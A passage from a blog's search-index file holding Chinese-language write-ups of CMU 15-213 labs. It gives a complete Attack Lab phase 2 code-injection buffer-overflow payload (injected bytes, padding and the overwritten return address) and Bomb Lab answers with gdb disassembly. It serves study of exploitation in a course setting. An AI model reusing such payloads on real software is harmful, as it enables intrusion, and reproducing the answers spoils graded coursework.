<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>CMU 15-213 labs 总结 -- Lab3 attack lab</title>
      <link href="/2023/01/23/cmu15213lab2attacklab/"/>
      <url>/2023/01/23/cmu15213lab2attacklab/</url>
      
        <content type="html"><![CDATA[<p>CMU 15-213 labs 总结</p><h2 id="Lab3-attack-lab"><a href="#Lab3-attack-lab" class="headerlink" title="Lab3 attack lab"></a>Lab3 attack lab</h2><h3 id="phase-2"><a href="#phase-2" class="headerlink" title="phase 2"></a>phase 2</h3><p>phase2我犯了很多错，我会记录自己的误区以及如何解phase 2.</p><p>phase 2 的思路：<br>phase 2与phase 1类似，我们在执行到getbuf结尾要return的时候，要使得代码不是return回test，而是return到我们inject的code的开头。当inject code执行完要return时，要return到touch2.</p><p>我们inject的code要做两件事：1. 将cookie移到%rdi（存放第一个arg的register）2. return到touch2. 因此，inject code的assembly code应该是:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov    $0x59b997fa,%rdi</span><br><span class="line">pushq  $0x4017ec</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><p>其中，$0x59b997fa是cookie, $0x4017ec是touch2的入口地址。touch2的入口地址可通过objdump -d .&#x2F;ctarget得到。不能把%rdi换成%edi,不对。</p><p>将上面三行assembly code存成.s文件，命名为injectcode.s，用gcc -c injectcode.s 编译得到injectcode.o, 用objdump -d injectcode.o &gt; injectcode.d得到injectcode.d文件，点开，如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">injectcode.o:     file format elf64-x86-64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">0000000000000000 &lt;.text&gt;:</span><br><span class="line">   0:48 c7 c7 fa 97 b9 59 mov    $0x59b997fa,%rdi</span><br><span class="line">   7:68 ec 17 40 00       push   $0x4017ec</span><br><span class="line">   c:c3                   ret    </span><br></pre></td></tr></table></figure><p>其中。48 c7 c7 fa 97 b9 59 是mov    $0x59b997fa,%rdi命令的机器编码。类似phase 1，getbuf的预留空间是40 byte, 所以我们要输入40 byte的字符去填充，然后是inject code的起始地址。所以我们要输入的机器码是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">48 c7 c7 fa 97 b9 59 68 ec 17 40 00 c3</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00</span><br><span class="line">78 dc 61 55 00 00 00 00</span><br></pre></td></tr></table></figure><p>其中78 dc 61 55 00 00 00 00是inject code的起始地址，前面的一共有40 byte。<br>注意，我们不能写成下面这样：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><p>即我们不能在命令之间填充0，而要在所有命令结束之后填充0，否则就会出错。这点可以参考：<a href="https://stackoverflow.com/questions/64471363/the-attack-lab-phase-2-buffer-oveflow-attack">https://stackoverflow.com/questions/64471363/the-attack-lab-phase-2-buffer-oveflow-attack</a></p><p>其实我自己通过实验发现，即便是输入连续的命令编码，机器是可以区分在哪里断开，哪几个byte是一个命令，下一个命令是哪几个byte.</p><p>如何知道inject code的起始地址？<br>这里我犯了一个错误。一开始的时候我并不知道inject code的机器码是要存放在getbuf的那40个byte中的，我以为还像phase 1一样随便输入40byte的字符填充就行了。如果是这样的话那inject code的起始地址在哪里呢？我观察injectcode.d文件，因为0000000000000000 &lt;.text&gt;，我以为inject code的起始地址是0000000000000000。但是只要你用objdump -d得到的.d文件的起始地址都是0000000000000000，所以这应该只是一个形式上的地址，不是真实的地址。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">injectcode.o:     file format elf64-x86-64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">0000000000000000 &lt;.text&gt;:</span><br><span class="line">   0:48 c7 c7 fa 97 b9 59 mov    $0x59b997fa,%rdi</span><br><span class="line">   7:68 ec 17 40 00       push   $0x4017ec</span><br><span class="line">   c:c3                   ret    </span><br></pre></td></tr></table></figure><p>后来看了别人的解析我才知道inject code是要存放在那40个byte里的。因此我们自然可以用GDB得到inject code的起始地址，即%rsp的位置，为0x5561dc78.因此，答案为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">48 c7 c7 fa 97 b9 59 68 ec 17 40 00 c3</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00</span><br><span class="line">78 dc 61 55 00 00 00 00</span><br></pre></td></tr></table></figure><p>我们将该文件存为phase2_solution.txt, 在执行下面两行命令即可pass phase 2。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./hex2raw &lt; phase2_solution.txt &gt; phase2_input.txt</span><br><span class="line">./ctarget -q -i phase2_input.txt</span><br></pre></td></tr></table></figure><p>做的过程中我还有一个误区。我们要从getbuf return 到inject code, 我以为要将inject code的起始地址move 到%rax中，因为%rax是return register. 但其实不是这样。%rax存放的应该是被调用函数的返回值。我们要返回到inject code,需要将inject code的起始地址push到stack里。当函数调用结束时，该函数的stack frame会弹出，函数会转跳到stack中存放的return address（即instruction pointer %rip 会转跳到return address）。</p><p><img src="https://raw.githubusercontent.com/Ginko-L/pictures/main/lab2_stacks.png?token=GHSAT0AAAAAAB6BTTF77FOEROLNWQXR2CREY6V2AAQ" alt="attack lab stack"></p>]]></content>
      
      
      <categories>
          
          <category> 自学 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CMU 15-213 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CMU 15-213 labs 总结 -- Lab2 Bombs lab</title>
      <link href="/2023/01/23/cmu-15-213-labs-zong-jie/"/>
      <url>/2023/01/23/cmu-15-213-labs-zong-jie/</url>
      
        <content type="html"><![CDATA[<p>CMU 15-213 labs 总结</p><h2 id="Lab2-Bombs-lab"><a href="#Lab2-Bombs-lab" class="headerlink" title="Lab2 Bombs lab"></a>Lab2 Bombs lab</h2><h3 id="main"><a href="#main" class="headerlink" title="main"></a>main</h3><p>首先，用gdb bomb来执行。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">~/CMU_15213/labs/bomblab/bomb$ gdb bomb</span><br></pre></td></tr></table></figure><p>用start启动程序但只执行一行。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(gdb) start</span><br></pre></td></tr></table></figure><p>main function的汇编：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">(gdb) disas</span><br><span class="line">Dump of assembler code for function main:</span><br><span class="line">   0x0000000000400da0 &lt;+0&gt;:push   %rbx</span><br><span class="line">=&gt; 0x0000000000400da1 &lt;+1&gt;:cmp    $0x1,%edi</span><br><span class="line">   0x0000000000400da4 &lt;+4&gt;:jne    0x400db6 &lt;main+22&gt;</span><br><span class="line">   0x0000000000400da6 &lt;+6&gt;:mov    0x20299b(%rip),%rax        # 0x603748 &lt;stdin@@GLIBC_2.2.5&gt;</span><br><span class="line">   0x0000000000400dad &lt;+13&gt;:mov    %rax,0x2029b4(%rip)        # 0x603768 &lt;infile&gt;</span><br><span class="line">   0x0000000000400db4 &lt;+20&gt;:jmp    0x400e19 &lt;main+121&gt;</span><br><span class="line">   0x0000000000400db6 &lt;+22&gt;:mov    %rsi,%rbx</span><br><span class="line">   0x0000000000400db9 &lt;+25&gt;:cmp    $0x2,%edi</span><br><span class="line">   0x0000000000400dbc &lt;+28&gt;:jne    0x400df8 &lt;main+88&gt;</span><br><span class="line">   0x0000000000400dbe &lt;+30&gt;:mov    0x8(%rsi),%rdi</span><br><span class="line">   0x0000000000400dc2 &lt;+34&gt;:mov    $0x4022b4,%esi</span><br><span class="line">   0x0000000000400dc7 &lt;+39&gt;:call   0x400c10 &lt;fopen@plt&gt;</span><br><span class="line">   0x0000000000400dcc &lt;+44&gt;:mov    %rax,0x202995(%rip)        # 0x603768 &lt;infile&gt;</span><br><span class="line">   0x0000000000400dd3 &lt;+51&gt;:test   %rax,%rax</span><br><span class="line">   0x0000000000400dd6 &lt;+54&gt;:jne    0x400e19 &lt;main+121&gt;</span><br><span class="line">   0x0000000000400dd8 &lt;+56&gt;:mov    0x8(%rbx),%rcx</span><br><span class="line">   0x0000000000400ddc &lt;+60&gt;:mov    (%rbx),%rdx</span><br><span class="line">   0x0000000000400ddf &lt;+63&gt;:mov    $0x4022b6,%esi</span><br><span class="line">   0x0000000000400de4 &lt;+68&gt;:mov    $0x1,%edi</span><br><span class="line">   0x0000000000400de9 &lt;+73&gt;:call   0x400c00 &lt;__printf_chk@plt&gt;</span><br><span class="line">   0x0000000000400dee &lt;+78&gt;:mov    $0x8,%edi</span><br><span class="line">   0x0000000000400df3 &lt;+83&gt;:call   0x400c20 &lt;exit@plt&gt;</span><br><span class="line">   0x0000000000400df8 &lt;+88&gt;:mov    (%rsi),%rdx</span><br><span class="line">   0x0000000000400dfb &lt;+91&gt;:mov    $0x4022d3,%esi</span><br><span class="line">   0x0000000000400e00 &lt;+96&gt;:mov    $0x1,%edi</span><br><span class="line">   0x0000000000400e05 &lt;+101&gt;:mov    $0x0,%eax</span><br><span class="line">   0x0000000000400e0a &lt;+106&gt;:call   0x400c00 &lt;__printf_chk@plt&gt;</span><br><span class="line">   0x0000000000400e0f &lt;+111&gt;:mov    $0x8,%edi</span><br><span class="line">   0x0000000000400e14 &lt;+116&gt;:call   0x400c20 &lt;exit@plt&gt;</span><br><span class="line">   0x0000000000400e19 &lt;+121&gt;:call   0x4013a2 &lt;initialize_bomb&gt;</span><br><span class="line">   0x0000000000400e1e &lt;+126&gt;:mov    $0x402338,%edi</span><br><span class="line">   0x0000000000400e23 &lt;+131&gt;:call   0x400b10 &lt;puts@plt&gt;</span><br><span class="line">   0x0000000000400e28 &lt;+136&gt;:mov    $0x402378,%edi</span><br><span class="line">   0x0000000000400e2d &lt;+141&gt;:call   0x400b10 &lt;puts@plt&gt;</span><br><span class="line">   0x0000000000400e32 &lt;+146&gt;:call   0x40149e &lt;read_line&gt;</span><br><span class="line">   0x0000000000400e37 &lt;+151&gt;:mov    %rax,%rdi</span><br><span class="line">--Type &lt;RET&gt; for more, q to quit, c to continue without paging--</span><br><span class="line">   0x0000000000400e3a &lt;+154&gt;:call   0x400ee0 &lt;phase_1&gt;</span><br><span class="line">   0x0000000000400e3f &lt;+159&gt;:call   0x4015c4 &lt;phase_defused&gt;</span><br><span class="line">   0x0000000000400e44 &lt;+164&gt;:mov    $0x4023a8,%edi</span><br><span class="line">   0x0000000000400e49 &lt;+169&gt;:call   0x400b10 &lt;puts@plt&gt;</span><br><span class="line">   0x0000000000400e4e &lt;+174&gt;:call   0x40149e &lt;read_line&gt;</span><br><span class="line">   0x0000000000400e53 &lt;+179&gt;:mov    %rax,%rdi</span><br><span class="line">   0x0000000000400e56 &lt;+182&gt;:call   0x400efc &lt;phase_2&gt;</span><br><span class="line">   0x0000000000400e5b &lt;+187&gt;:call   0x4015c4 &lt;phase_defused&gt;</span><br><span class="line">   0x0000000000400e60 &lt;+192&gt;:mov    $0x4022ed,%edi</span><br><span class="line">   0x0000000000400e65 &lt;+197&gt;:call   0x400b10 &lt;puts@plt&gt;</span><br><span class="line">   0x0000000000400e6a &lt;+202&gt;:call   0x40149e &lt;read_line&gt;</span><br><span class="line">   0x0000000000400e6f &lt;+207&gt;:mov    %rax,%rdi</span><br><span class="line">   0x0000000000400e72 &lt;+210&gt;:call   0x400f43 &lt;phase_3&gt;</span><br><span class="line">   0x0000000000400e77 &lt;+215&gt;:call   0x4015c4 &lt;phase_defused&gt;</span><br><span class="line">   0x0000000000400e7c &lt;+220&gt;:mov    $0x40230b,%edi</span><br><span class="line">   0x0000000000400e81 &lt;+225&gt;:call   0x400b10 &lt;puts@plt&gt;</span><br><span class="line">   0x0000000000400e86 &lt;+230&gt;:call   0x40149e &lt;read_line&gt;</span><br><span class="line">   0x0000000000400e8b &lt;+235&gt;:mov    %rax,%rdi</span><br><span class="line">   0x0000000000400e8e &lt;+238&gt;:call   0x40100c &lt;phase_4&gt;</span><br><span class="line">   0x0000000000400e93 &lt;+243&gt;:call   0x4015c4 &lt;phase_defused&gt;</span><br><span class="line">   0x0000000000400e98 &lt;+248&gt;:mov    $0x4023d8,%edi</span><br><span class="line">   0x0000000000400e9d &lt;+253&gt;:call   0x400b10 &lt;puts@plt&gt;</span><br><span class="line">   0x0000000000400ea2 &lt;+258&gt;:call   0x40149e &lt;read_line&gt;</span><br><span class="line">   0x0000000000400ea7 &lt;+263&gt;:mov    %rax,%rdi</span><br><span class="line">   0x0000000000400eaa &lt;+266&gt;:call   0x401062 &lt;phase_5&gt;</span><br><span class="line">   0x0000000000400eaf &lt;+271&gt;:call   0x4015c4 &lt;phase_defused&gt;</span><br><span class="line">   0x0000000000400eb4 &lt;+276&gt;:mov    $0x40231a,%edi</span><br><span class="line">   0x0000000000400eb9 &lt;+281&gt;:call   0x400b10 &lt;puts@plt&gt;</span><br><span class="line">   0x0000000000400ebe &lt;+286&gt;:call   0x40149e &lt;read_line&gt;</span><br><span class="line">   0x0000000000400ec3 &lt;+291&gt;:mov    %rax,%rdi</span><br><span class="line">   0x0000000000400ec6 &lt;+294&gt;:call   0x4010f4 &lt;phase_6&gt;</span><br><span class="line">   0x0000000000400ecb &lt;+299&gt;:call   0x4015c4 &lt;phase_defused&gt;</span><br><span class="line">   0x0000000000400ed0 &lt;+304&gt;:mov    $0x0,%eax</span><br><span class="line">   0x0000000000400ed5 &lt;+309&gt;:pop    %rbx</span><br><span class="line">   0x0000000000400ed6 &lt;+310&gt;:ret    </span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure><h3 id="phase-1"><a href="#phase-1" class="headerlink" title="phase 1"></a>phase 1</h3><p>对phase 1 反汇编得到如下结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">0x0000000000400ee0 in phase_1 ()</span><br><span class="line">(gdb) disas</span><br><span class="line">Dump of assembler code for function phase_1:</span><br><span class="line">=&gt; 0x0000000000400ee0 &lt;+0&gt;:sub    $0x8,%rsp</span><br><span class="line">   0x0000000000400ee4 &lt;+4&gt;:mov    $0x402400,%esi</span><br><span class="line">   0x0000000000400ee9 &lt;+9&gt;:call   0x401338 &lt;strings_not_equal&gt;</span><br><span class="line">   0x0000000000400eee &lt;+14&gt;:test   %eax,%eax</span><br><span class="line">   0x0000000000400ef0 &lt;+16&gt;:je     0x400ef7 &lt;phase_1+23&gt;</span><br><span class="line">   0x0000000000400ef2 &lt;+18&gt;:call   0x40143a &lt;explode_bomb&gt;</span><br><span class="line">   0x0000000000400ef7 &lt;+23&gt;:add    $0x8,%rsp</span><br><span class="line">   0x0000000000400efb &lt;+27&gt;:ret    </span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure><p>由此可见，在phase 1阶段，我们需要输入一个string,该string必须和某个预设的string相等，否则就会explode_bomb.<br>由0x0000000000400ee4 &lt;+4&gt;:    mov    $0x402400,%esi可知，<br>该预设的string存储在地址0x402400，<br>用print （char *) 0x402400或x&#x2F;s 0x402400打印出该地址存储的string可得：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(gdb) x/s 0x402400</span><br><span class="line">0x402400:&quot;Border relations with Canada have never been better.&quot;</span><br><span class="line">(gdb) print (char *) 0x402400</span><br><span class="line">$1 = 0x402400 &quot;Border relations with Canada have never been better.&quot;</span><br></pre></td></tr></table></figure><p>因此，phase 1 需要输入Border relations with Canada have never been better.来defuse bomb.</p><h3 id="phase-2"><a href="#phase-2" class="headerlink" title="phase 2"></a>phase 2</h3><p>对phase 2反汇编：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">0x0000000000400efc in phase_2 ()</span><br><span class="line">(gdb) disas</span><br><span class="line">Dump of assembler code for function phase_2:</span><br><span class="line">=&gt; 0x0000000000400efc &lt;+0&gt;:push   %rbp</span><br><span class="line">   0x0000000000400efd &lt;+1&gt;:push   %rbx</span><br><span class="line">   0x0000000000400efe &lt;+2&gt;:sub    $0x28,%rsp</span><br><span class="line">   0x0000000000400f02 &lt;+6&gt;:mov    %rsp,%rsi</span><br><span class="line">   0x0000000000400f05 &lt;+9&gt;:call   0x40145c &lt;read_six_numbers&gt;</span><br><span class="line">   0x0000000000400f0a &lt;+14&gt;:cmpl   $0x1,(%rsp)</span><br><span class="line">   0x0000000000400f0e &lt;+18&gt;:je     0x400f30 &lt;phase_2+52&gt;</span><br><span class="line">   0x0000000000400f10 &lt;+20&gt;:call   0x40143a &lt;explode_bomb&gt;</span><br><span class="line">   0x0000000000400f15 &lt;+25&gt;:jmp    0x400f30 &lt;phase_2+52&gt;</span><br><span class="line">   0x0000000000400f17 &lt;+27&gt;:mov    -0x4(%rbx),%eax</span><br><span class="line">   0x0000000000400f1a &lt;+30&gt;:add    %eax,%eax</span><br><span class="line">   0x0000000000400f1c &lt;+32&gt;:cmp    %eax,(%rbx)</span><br><span class="line">   0x0000000000400f1e &lt;+34&gt;:je     0x400f25 &lt;phase_2+41&gt;</span><br><span class="line">   0x0000000000400f20 &lt;+36&gt;:call   0x40143a &lt;explode_bomb&gt;</span><br><span class="line">   0x0000000000400f25 &lt;+41&gt;:add    $0x4,%rbx</span><br><span class="line">   0x0000000000400f29 &lt;+45&gt;:cmp    %rbp,%rbx</span><br><span class="line">   0x0000000000400f2c &lt;+48&gt;:jne    0x400f17 &lt;phase_2+27&gt;</span><br><span class="line">   0x0000000000400f2e &lt;+50&gt;:jmp    0x400f3c &lt;phase_2+64&gt;</span><br><span class="line">   0x0000000000400f30 &lt;+52&gt;:lea    0x4(%rsp),%rbx</span><br><span class="line">   0x0000000000400f35 &lt;+57&gt;:lea    0x18(%rsp),%rbp</span><br><span class="line">   0x0000000000400f3a &lt;+62&gt;:jmp    0x400f17 &lt;phase_2+27&gt;</span><br><span class="line">   0x0000000000400f3c &lt;+64&gt;:add    $0x28,%rsp</span><br><span class="line">   0x0000000000400f40 &lt;+68&gt;:pop    %rbx</span><br><span class="line">   0x0000000000400f41 &lt;+69&gt;:pop    %rbp</span><br><span class="line">   0x0000000000400f42 &lt;+70&gt;:ret    </span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure><p>首先可知phase 2我们需要输入6个数。&lt;+27&gt;到&lt;+48&gt;是个循环。<br>   0x0000000000400f1a &lt;+30&gt;:    add    %eax,%eax<br>   0x0000000000400f1c &lt;+32&gt;:    cmp    %eax,(%rbx)<br>   0x0000000000400f1e &lt;+34&gt;:    je     0x400f25 &lt;phase_2+41&gt;<br>   0x0000000000400f20 &lt;+36&gt;:    call   0x40143a <explode_bomb><br>print $eax可知，每次循环中%eax存放的是我们输入的数字，print *rbx或print *(int *) $rbx可知%rbx中存放的是下一个数字，由上面四行可知，后一个数字要是前一个数字的两倍。所以答案为1 2 4 8 16 32</p><h3 id="phase-3"><a href="#phase-3" class="headerlink" title="phase 3"></a>phase 3</h3><p>phase 3 反汇编</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">0x0000000000400f43 in phase_3 ()</span><br><span class="line">(gdb) disas</span><br><span class="line">Dump of assembler code for function phase_3:</span><br><span class="line">=&gt; 0x0000000000400f43 &lt;+0&gt;:sub    $0x18,%rsp</span><br><span class="line">   0x0000000000400f47 &lt;+4&gt;:lea    0xc(%rsp),%rcx</span><br><span class="line">   0x0000000000400f4c &lt;+9&gt;:lea    0x8(%rsp),%rdx</span><br><span class="line">   0x0000000000400f51 &lt;+14&gt;:mov    $0x4025cf,%esi</span><br><span class="line">   0x0000000000400f56 &lt;+19&gt;:mov    $0x0,%eax</span><br><span class="line">   0x0000000000400f5b &lt;+24&gt;:call   0x400bf0 &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line">   0x0000000000400f60 &lt;+29&gt;:cmp    $0x1,%eax</span><br><span class="line">   0x0000000000400f63 &lt;+32&gt;:jg     0x400f6a &lt;phase_3+39&gt;</span><br><span class="line">   0x0000000000400f65 &lt;+34&gt;:call   0x40143a &lt;explode_bomb&gt;</span><br><span class="line">   0x0000000000400f6a &lt;+39&gt;:cmpl   $0x7,0x8(%rsp)</span><br><span class="line">   0x0000000000400f6f &lt;+44&gt;:ja     0x400fad &lt;phase_3+106&gt;</span><br><span class="line">   0x0000000000400f71 &lt;+46&gt;:mov    0x8(%rsp),%eax</span><br><span class="line">   0x0000000000400f75 &lt;+50&gt;:jmp    *0x402470(,%rax,8)</span><br><span class="line">   0x0000000000400f7c &lt;+57&gt;:mov    $0xcf,%eax</span><br><span class="line">   0x0000000000400f81 &lt;+62&gt;:jmp    0x400fbe &lt;phase_3+123&gt;</span><br><span class="line">   0x0000000000400f83 &lt;+64&gt;:mov    $0x2c3,%eax</span><br><span class="line">   0x0000000000400f88 &lt;+69&gt;:jmp    0x400fbe &lt;phase_3+123&gt;</span><br><span class="line">   0x0000000000400f8a &lt;+71&gt;:mov    $0x100,%eax</span><br><span class="line">   0x0000000000400f8f &lt;+76&gt;:jmp    0x400fbe &lt;phase_3+123&gt;</span><br><span class="line">   0x0000000000400f91 &lt;+78&gt;:mov    $0x185,%eax</span><br><span class="line">   0x0000000000400f96 &lt;+83&gt;:jmp    0x400fbe &lt;phase_3+123&gt;</span><br><span class="line">   0x0000000000400f98 &lt;+85&gt;:mov    $0xce,%eax</span><br><span class="line">   0x0000000000400f9d &lt;+90&gt;:jmp    0x400fbe &lt;phase_3+123&gt;</span><br><span class="line">   0x0000000000400f9f &lt;+92&gt;:mov    $0x2aa,%eax</span><br><span class="line">   0x0000000000400fa4 &lt;+97&gt;:jmp    0x400fbe &lt;phase_3+123&gt;</span><br><span class="line">   0x0000000000400fa6 &lt;+99&gt;:mov    $0x147,%eax</span><br><span class="line">   0x0000000000400fab &lt;+104&gt;:jmp    0x400fbe &lt;phase_3+123&gt;</span><br><span class="line">   0x0000000000400fad &lt;+106&gt;:call   0x40143a &lt;explode_bomb&gt;</span><br><span class="line">   0x0000000000400fb2 &lt;+111&gt;:mov    $0x0,%eax</span><br><span class="line">   0x0000000000400fb7 &lt;+116&gt;:jmp    0x400fbe &lt;phase_3+123&gt;</span><br><span class="line">   0x0000000000400fb9 &lt;+118&gt;:mov    $0x137,%eax</span><br><span class="line">   0x0000000000400fbe &lt;+123&gt;:cmp    0xc(%rsp),%eax</span><br><span class="line">   0x0000000000400fc2 &lt;+127&gt;:je     0x400fc9 &lt;phase_3+134&gt;</span><br><span class="line">   0x0000000000400fc4 &lt;+129&gt;:call   0x40143a &lt;explode_bomb&gt;</span><br><span class="line">   0x0000000000400fc9 &lt;+134&gt;:add    $0x18,%rsp</span><br><span class="line">   0x0000000000400fcd &lt;+138&gt;:ret    </span><br><span class="line">--Type &lt;RET&gt; for more, q to quit, c to continue without paging--</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure><p>&lt;+24&gt;行sscanf扫描我们的输入，&lt;+14&gt;是输入sscanf函数的参数。用print或x看一下是什么参数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(gdb) x 0x4025cf</span><br><span class="line">0x4025cf:&quot;%d %d&quot;</span><br><span class="line">(gdb) print (char*) 0x4025cf</span><br><span class="line">$6 = 0x4025cf &quot;%d %d&quot;</span><br></pre></td></tr></table></figure><p>由此可知，输入的是两个decimal number. 先随便输入两个数试试。我输入的第一个数是1.<br>&lt;+39&gt;，&lt;+44&gt;行可知第一个数存在0x8(%rsp)，要 &lt;&#x3D; 7.<br>&lt;+123&gt;, &lt;+127&gt;行可知第二个数存在0xc(%rsp)，要 &#x3D; 311.<br>所以一个答案为1 311.<br>实际上第一个数可以为[0, 7]中的整数，对应的可以得到第二个数的值。因此一下皆为正确答案。<br>0 207<br>1 311<br>2 707<br>3 256<br>4 389<br>5 206<br>6 682<br>7 327</p><h3 id="phase-4"><a href="#phase-4" class="headerlink" title="phase 4"></a>phase 4</h3><p>phase 4 反汇编：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">0x000000000040100c in phase_4 ()</span><br><span class="line">(gdb) disas</span><br><span class="line">Dump 